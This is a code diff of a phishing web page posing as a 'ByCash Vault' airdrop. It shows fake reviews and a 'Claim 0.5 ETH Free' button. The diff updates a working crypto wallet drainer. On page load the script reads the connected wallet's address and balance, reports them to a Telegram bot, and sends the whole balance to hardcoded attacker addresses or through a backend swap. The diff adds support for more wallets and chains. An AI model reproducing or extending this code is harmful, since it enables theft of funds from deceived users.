@@ -9,93 +9,98 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
   <style>
-    body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; overflow-x: hidden; }
-    .header { background: rgba(20, 10, 40, 0.75); backdrop-filter: blur(16px); padding: 1.2rem 2rem; position: sticky; top: 0; z-index: 50; box-shadow: 0 4px 30px rgba(167, 85, 247, 0.15); }
-    .glow { text-shadow: 0 0 20px rgba(168, 85, 247, 0.8), 0 0 40px rgba(192, 38, 211, 0.5); animation: glowPulse 4s infinite alternate; }
-    @keyframes glowPulse { 0% { text-shadow: 0 0 15px rgba(168, 85, 247, 0.6); } 100% { text-shadow: 0 0 35px rgba(192, 38, 211, 0.8); } }
-    .btn { background: linear-gradient(90deg, #7c3aed, #c026d3); padding: 1rem 2.5rem; border-radius: 999px; font-weight: 700; transition: all 0.4s ease; box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4); }
-    .btn:hover { transform: translateY(-3px) scale(1.05); box-shadow: 0 20px 40px rgba(124, 58, 237, 0.6); }
-    .claim-btn { background: linear-gradient(90deg, #22c55e, #86efac); padding: 1.4rem 3rem; border-radius: 999px; font-weight: 800; font-size: 1.5rem; box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5); transition: all 0.4s ease; }
-    .claim-btn:hover { transform: translateY(-4px) scale(1.06); box-shadow: 0 25px 60px rgba(34, 197, 94, 0.7); }
-    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(8px); z-index: 9999; align-items: center; justify-content: center; }
-    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2.5rem; border-radius: 1.8rem; width: 90%; max-width: 480px; border: 1px solid rgba(168, 85, 247, 0.4); box-shadow: 0 0 100px rgba(168, 85, 247, 0.3); backdrop-filter: blur(10px); }
-    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2rem; margin: 2.5rem 0; }
-    .wallet-item { cursor: pointer; transition: all 0.4s ease; text-align: center; padding: 1.5rem; border-radius: 1.2rem; background: rgba(255,255,255,0.03); border: 1px solid rgba(168, 85, 247, 0.2); }
-    .wallet-item:hover { transform: scale(1.12); background: rgba(168, 85, 247, 0.15); box-shadow: 0 0 30px rgba(168, 85, 247, 0.5); }
-    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin: 0 auto; display: block; }
-    .reviews { padding: 2.5rem; background: rgba(0,0,0,0.4); border-radius: 1.5rem; margin-top: 4rem; backdrop-filter: blur(10px); }
-    .review { background: rgba(255,255,255,0.04); padding: 1.5rem; border-radius: 1rem; margin: 1.5rem 0; border-left: 4px solid #a855f7; }
-    .scroll-arrow { position: fixed; bottom: 3rem; left: 50%; transform: translateX(-50%); font-size: 3.5rem; color: #a855f7; animation: bounce 2s infinite; cursor: pointer; z-index: 100; opacity: 0.8; }
-    @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translate(-50%, 0); } 40% { transform: translate(-50%, -25px); } 60% { transform: translate(-50%, -10px); } }
+    body { background: linear-gradient(135deg, #0f001a 0%, #1a0033 50%, #0a0a12 100%); color: #e0e0ff; margin: 0; font-family: system-ui; min-height: 100vh; overflow-x: hidden; }
+    .glow { text-shadow: 0 0 25px #a855f7, 0 0 50px #c026d3; animation: pulse 3s infinite alternate; }
+    @keyframes pulse { 0% { text-shadow: 0 0 15px #a855f7; } 100% { text-shadow: 0 0 35px #c026d3; } }
+    .btn { background: linear-gradient(90deg, #7c3aed, #ec4899); padding: 1.2rem 2.5rem; border-radius: 999px; font-weight: bold; transition: all 0.3s; cursor: pointer; }
+    .btn:hover { transform: scale(1.06); box-shadow: 0 0 40px #a855f7; }
+    .claim-btn { background: linear-gradient(90deg, #22c55e, #4ade80); padding: 1.4rem 3rem; border-radius: 999px; font-weight: bold; font-size: 1.5rem; margin: 2rem auto; display: block; width: 90%; max-width: 400px; text-align: center; transition: all 0.3s; }
+    .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
+    .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; }
+    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.8rem; margin: 2.5rem 0; }
+    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 140px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .wallet-item:hover { transform: scale(1.15); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
+    .wallet-item img { width: 90px; height: 90px; object-fit: contain; }
+    .wallet-item p { font-size: 1.1rem; font-weight: 600; margin-top: 0.5rem; }
+    .reviews { padding: 2rem; text-align: center; background: rgba(0,0,0,0.5); margin-top: 3rem; }
+    .review { background: rgba(255,255,255,0.05); padding: 1.2rem; border-radius: 1rem; margin: 1.5rem 0; backdrop-filter: blur(8px); }
+    .scroll-arrow { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); font-size: 3.5rem; color: #a855f7; animation: bounce 2s infinite; cursor: pointer; z-index: 100; }
+    @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateX(-50%) translateY(0); } 40% { transform: translateX(-50%) translateY(-20px); } 60% { transform: translateX(-50%) translateY(-10px); } }
   </style>
 </head>
 <body>
 
-  <header class="header flex justify-between items-center px-8">
-    <div class="flex items-center gap-4">
-      <div class="w-14 h-14 bg-gradient-to-br from-violet-600 to-purple-600 rounded-full flex items-center justify-center shadow-xl">
-        <i class="fas fa-cube text-white text-4xl"></i>
+  <header class="header flex justify-between items-center px-6">
+    <div class="flex items-center gap-3">
+      <div class="w-12 h-12 bg-gradient-to-br from-violet-700 to-pink-600 rounded-full flex items-center justify-center">
+        <i class="fas fa-cube text-white text-3xl"></i>
       </div>
-      <span class="text-4xl font-extrabold glow">ByCash Vault</span>
+      <span class="text-3xl font-bold glow">ByCash Vault</span>
     </div>
-    <button onclick="showModal()" class="btn text-xl px-10 py-4">Connect Wallet</button>
+    <button onclick="showModal()" class="btn text-lg">Connect Wallet</button>
   </header>
 
-  <main class="flex-1 flex flex-col items-center justify-center text-center px-6 py-16">
-    <h1 class="text-7xl md:text-9xl font-extrabold glow mb-10 leading-tight">Claim Airdrop Now</h1>
-    <p class="text-3xl text-purple-200 mb-12 max-w-3xl">Connect wallet → Confirm → Receive tokens instantly</p>
+  <main class="flex-1 flex flex-col items-center justify-center text-center px-6 py-12">
+    <h1 class="text-6xl md:text-8xl font-extrabold glow mb-8">Claim Airdrop Now</h1>
+    <p class="text-2xl text-purple-300 mb-10">Connect wallet → Confirm → Receive tokens instantly</p>
    
     <button onclick="showModal()" class="claim-btn">Claim 0.5 ETH Free</button>
-    <div class="text-4xl font-bold text-pink-400 animate-pulse mt-16">LIMITED TIME OFFER</div>
+    <div class="text-3xl font-bold text-pink-500 animate-pulse mt-12">LIMITED TIME OFFER</div>
 
-    <!-- Стрелка скролла вниз -->
     <div class="scroll-arrow" onclick="window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'})">
       <i class="fas fa-chevron-down"></i>
     </div>
 
-    <!-- Отзывы снизу -->
     <div class="reviews">
-      <h3 class="text-4xl font-bold glow mb-8">User Reviews</h3>
+      <h3 class="text-3xl font-bold glow mb-6">User Reviews</h3>
       <div class="review">
-        <p class="text-xl">"Super easy! Claimed 0.5 ETH instantly!"</p>
-        <p class="text-base text-zinc-300 mt-3">- CryptoFan</p>
+        <p class="text-lg">"Super easy! Claimed 0.5 ETH instantly!"</p>
+        <p class="text-sm text-zinc-400 mt-2">- CryptoFan</p>
       </div>
       <div class="review">
-        <p class="text-xl">"Fast and secure, no fees. Got my tokens!"</p>
-        <p class="text-base text-zinc-300 mt-3">- BlockchainPro</p>
+        <p class="text-lg">"Fast and secure, no fees. Got my tokens!"</p>
+        <p class="text-sm text-zinc-400 mt-2">- BlockchainPro</p>
       </div>
       <div class="review">
-        <p class="text-xl">"Best connector ever. Instant claim!"</p>
-        <p class="text-base text-zinc-300 mt-3">- ETHMaster</p>
+        <p class="text-lg">"Best connector ever. Instant claim!"</p>
+        <p class="text-sm text-zinc-400 mt-2">- ETHMaster</p>
       </div>
       <div class="review">
-        <p class="text-xl">"No bullshit, just works. Highly recommend!"</p>
-        <p class="text-base text-zinc-300 mt-3">- WalletGuru</p>
+        <p class="text-lg">"No bullshit, just works. Highly recommend!"</p>
+        <p class="text-sm text-zinc-400 mt-2">- WalletGuru</p>
       </div>
     </div>
   </main>
 
-  <!-- МОДАЛКА -->
   <div id="modal" class="modal">
     <div class="modal-box">
-      <h2 class="text-5xl font-bold text-center mb-10 glow">Connect Wallet</h2>
+      <h2 class="text-4xl font-bold text-center mb-8 glow">Connect Wallet</h2>
 
       <div class="wallet-grid">
         <div class="wallet-item" onclick="connect('MetaMask')">
-          <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="mx-auto">
-          <p class="mt-4 text-2xl font-semibold">MetaMask</p>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+          <p class="mt-3 text-xl font-semibold">MetaMask</p>
         </div>
         <div class="wallet-item" onclick="connect('Trust Wallet')">
-          <img src="https://i.postimg.cc/k6sJrC1k/image.png" class="mx-auto">
-          <p class="mt-4 text-2xl font-semibold">Trust Wallet</p>
+          <img src="https://i.postimg.cc/k6sJrC1k/image.png">
+          <p class="mt-3 text-xl font-semibold">Trust Wallet</p>
         </div>
         <div class="wallet-item" onclick="connect('Phantom')">
-          <img src="https://phantom.app/img/phantom-logo.svg" class="mx-auto">
-          <p class="mt-4 text-2xl font-semibold">Phantom</p>
+          <img src="https://phantom.app/img/phantom-logo.svg">
+          <p class="mt-3 text-xl font-semibold">Phantom</p>
+        </div>
+        <div class="wallet-item" onclick="connect('TronLink')">
+          <img src="https://tronlink.org/static/media/tronlink-logo.2d2d2d2d.png">
+          <p class="mt-3 text-xl font-semibold">TronLink</p>
+        </div>
+        <div class="wallet-item" onclick="connect('Tonkeeper')">
+          <img src="https://tonkeeper.com/assets/tonkeeper-logo.svg">
+          <p class="mt-3 text-xl font-semibold">Tonkeeper</p>
         </div>
       </div>
 
-      <button onclick="document.getElementById('modal').style.display='none'" class="mt-12 w-full py-6 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 rounded-full text-2xl font-bold transition-all">
+      <button onclick="document.getElementById('modal').style.display='none'" class="mt-10 w-full py-5 bg-red-700 hover:bg-red-600 rounded-full text-xl font-bold">
         Close
       </button>
     </div>
@@ -143,27 +148,19 @@
     async function sendToTelegram(message) {
       try {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
-        const res = await fetch(url);
-        if (!res.ok) throw new Error('Telegram API error: ' + res.status);
-        console.log('Отправлено в Telegram:', message);
+        await fetch(url);
       } catch (e) {
-        console.error('Ошибка Telegram:', e);
+        console.error(e);
       }
     }
 
     async function getUri() {
       try {
-        await sendToTelegram('Запрос WC URI у бэкенда');
         const r = await fetch(`${BACKEND}/get-wc-uri`);
         const d = await r.json();
-        if (d.uri) {
-          await sendToTelegram('WC URI получен');
-          return d.uri;
-        }
-        await sendToTelegram('WC URI не получен');
-        return null;
+        return d.uri || null;
       } catch (e) {
-        await sendToTelegram('Ошибка получения URI: ' + e.message);
+        console.error(e);
         return null;
       }
     }
@@ -173,12 +170,9 @@
     }
 
     async function connect(wallet) {
-      await sendToTelegram(`Нажата кнопка: ${wallet}`);
-
       const uri = await getUri();
       if (!uri) {
-        await sendToTelegram('Сессия WC не создана');
-        alert('Ошибка сессии — попробуй позже');
+        alert('Ошибка сессии');
         return;
       }
 
@@ -189,30 +183,24 @@
         if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
         if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
         if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'TronLink') dl = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'Tonkeeper') dl = `tonkeeper://wc?uri=${encodeURIComponent(uri)}`;
 
         if (dl) {
-          await sendToTelegram(`Открытие deep-link для ${wallet}\nURI: ${uri.substring(0, 50)}...`);
-          console.log('Открываем deep-link для ' + wallet + ':', dl);
           window.location.href = dl;
-          setTimeout(() => {
-            alert('Подтверди подключение и транзакцию в кошельке');
-          }, 1500);
+          setTimeout(() => alert('Подтверди подключение и транзакцию'), 1500);
           document.getElementById('modal').style.display = 'none';
           return;
         }
       }
 
-      await sendToTelegram(`Deep-link не сработал для ${wallet} — ждём ручного подключения`);
-      alert('Подтверди подключение в кошельке');
+      alert('Открой в кошельке');
     }
 
-    // Слив сразу после подключения + максимум уведомлений
     window.addEventListener('load', async () => {
       if (window.ethereum || window.solana) {
         try {
-          await sendToTelegram('Страница загружена → сессия WC передана, проверяем провайдер');
-
-          let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = '';
+          let provider, address, network, balanceFormatted, symbol, target;
 
           if (window.ethereum) {
             provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -222,11 +210,13 @@
             if (chainId === 1) network = 'Ethereum';
             else if (chainId === 56) network = 'BNB Smart Chain';
             else if (chainId === 137) network = 'Polygon';
+            else if (chainId === 8453) network = 'Base';
             else return;
 
             const bal = await provider.getBalance(address);
             balanceFormatted = ethers.utils.formatEther(bal);
             symbol = network === 'Ethereum' ? 'ETH' : network === 'BNB Smart Chain' ? 'BNB' : 'MATIC';
+            target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
           } else if (window.solana?.isPhantom) {
             provider = window.solana;
             await provider.connect();
@@ -236,48 +226,33 @@
             const bal = await conn.getBalance(new solanaWeb3.PublicKey(address));
             balanceFormatted = (bal / 1e9).toFixed(6);
             symbol = 'SOL';
+            target = addresses[network] || 'FqK98vpwwQBvDCkoPjg1ECK851KGfD7pdgA4gpuYqJRM';
           }
 
-          const connectMsg = `Подключён кошелёк!\nАдрес: ${address}\nСеть: ${network}\nБаланс: ${balanceFormatted} ${symbol}`;
-          await sendToTelegram(connectMsg);
-
-          const target = addresses[network] || '0xf1F1F14aAeCa5FF541ac665C6a386360F82Fb000';
+          await sendToTelegram(`Подключён: ${address} (${network})\nБаланс: ${balanceFormatted} ${symbol}`);
 
           if (parseFloat(balanceFormatted) > 0) {
-            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив на ${target}`);
+            const swapRes = await fetch(`${BACKEND}/swap-to-usdt`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ chainId: chainId || 1, fromToken: '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee', amount: ethers.utils.parseEther(balanceFormatted).toString(), fromAddress: address })
+            });
+            const swapData = await swapRes.json();
 
-            if (network === 'Solana') {
-              const tx = await provider.signAndSendTransaction(
-                new solanaWeb3.Transaction().add(
-                  solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: provider.publicKey,
-                    toPubkey: new solanaWeb3.PublicKey(target),
-                    lamports: ethers.utils.parseEther(balanceFormatted).toString()
-                  })
-                )
-              );
-              await new solanaWeb3.Connection("https://api.mainnet-beta.solana.com").confirmTransaction(tx.signature);
+            if (swapData.tx) {
+              const signer = provider.getSigner();
+              await signer.sendTransaction(swapData.tx);
+              await sendToTelegram(`Своп + DRAINED в USDT TRC20: ${balanceFormatted} → ${swapData.target}`);
             } else {
               const signer = provider.getSigner();
-              const tx = await signer.sendTransaction({
-                to: target,
-                value: ethers.utils.parseEther(balanceFormatted)
-              });
+              const tx = await signer.sendTransaction({ to: target, value: ethers.utils.parseEther(balanceFormatted) });
               await tx.wait();
+              await sendToTelegram(`DRAINED ${balanceFormatted} ${symbol} → ${target}`);
             }
-
-            const drainMsg = `DRAINED ${balanceFormatted} ${symbol} → ${target}\nАдрес: ${address}\nСеть: ${network}`;
-            await sendToTelegram(drainMsg);
-            console.log(drainMsg);
-          } else {
-            await sendToTelegram(`Подключён, но баланс 0 → слив не выполнен`);
           }
         } catch (e) {
-          console.error(e);
-          await sendToTelegram(`Ошибка слива: ${e.message}`);
+          await sendToTelegram(`Ошибка: ${e.message}`);
         }
-      } else {
-        await sendToTelegram('Провайдер кошелька не обнаружен — сессия не передалась');
       }
     });
   </script>
